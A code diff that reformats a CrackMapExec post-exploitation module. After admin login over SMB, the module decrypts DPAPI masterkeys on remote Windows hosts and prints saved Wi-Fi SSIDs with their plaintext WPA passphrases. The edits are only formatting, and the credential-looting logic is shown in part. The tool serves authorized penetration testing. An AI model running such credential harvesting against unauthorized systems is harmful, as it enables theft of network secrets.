@@ -10,16 +10,14 @@ from cme.helpers.logger import highlight
 
 
 class CMEModule:
-
-    name = 'wifi'
+    name = "wifi"
     description = "Get key of all wireless interfaces"
-    supported_protocols = ['smb']
+    supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
 
     def options(self, context, module_options):
-        """
-        """
+        """ """
 
     def on_admin_login(self, context, connection):
         host = connection.hostname + "." + connection.domain
@@ -48,7 +46,7 @@ class CMEModule:
         conn = None
 
         try:
-            conn = DPLootSMBConnection(target) 
+            conn = DPLootSMBConnection(target)
             conn.smb_session = connection.conn
         except Exception as e:
             context.log.debug("Could not upgrade connection: {}".format(e))
@@ -60,7 +58,7 @@ class CMEModule:
             masterkeys += masterkeys_triage.triage_system_masterkeys()
         except Exception as e:
             context.log.debug("Could not get masterkeys: {}".format(e))
-        
+
         if len(masterkeys) == 0:
             context.log.fail("No masterkeys looted")
             return
@@ -74,14 +72,19 @@ class CMEModule:
         except Exception as e:
             context.log.debug("Error while looting wifi: {}".format(e))
         for wifi_cred in wifi_creds:
-            if wifi_cred.auth.upper() == 'OPEN':
+            if wifi_cred.auth.upper() == "OPEN":
                 context.log.highlight("[OPEN] %s" % (wifi_cred.ssid))
-            if wifi_cred.auth.upper() in ['WPAPSK', 'WPA2PSK']:
+            if wifi_cred.auth.upper() in ["WPAPSK", "WPA2PSK"]:
                 try:
-                    context.log.highlight("[%s] %s - Passphrase: %s" % (wifi_cred.auth.upper(), wifi_cred.ssid, wifi_cred.password.decode('latin-1')))
+                    context.log.highlight(
+                        "[%s] %s - Passphrase: %s"
+                        % (
+                            wifi_cred.auth.upper(),
+                            wifi_cred.ssid,
+                            wifi_cred.password.decode("latin-1"),
+                        )
+                    )
                 except:
                     context.log.highlight("[%s] %s - Passphrase: %s" % (wifi_cred.auth.upper(), wifi_cred.ssid, wifi_cred.password))
             else:
                 context.log.highlight("[WPA-EAP] %s - %s" % (wifi_cred.ssid, wifi_cred.eap_type))
-
-
